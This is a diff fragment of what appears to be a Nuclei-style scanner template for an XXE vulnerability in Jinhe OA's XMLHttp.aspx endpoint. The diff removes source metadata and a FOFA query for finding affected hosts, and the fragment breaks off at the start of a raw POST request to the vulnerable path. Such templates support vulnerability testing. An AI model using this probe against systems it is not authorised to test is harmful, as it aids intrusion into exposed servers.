@@ -3,12 +3,8 @@ info:
   name: 金和OA JHSoft.Web.CrmSystemSet XMLHttp.aspx 存在XXE漏洞_pm5zgdcigk0xl6lg
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: xxe,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/JHSoft.Web.CrmSystemSet/XMLHttp.aspx/ HTTP/1.1
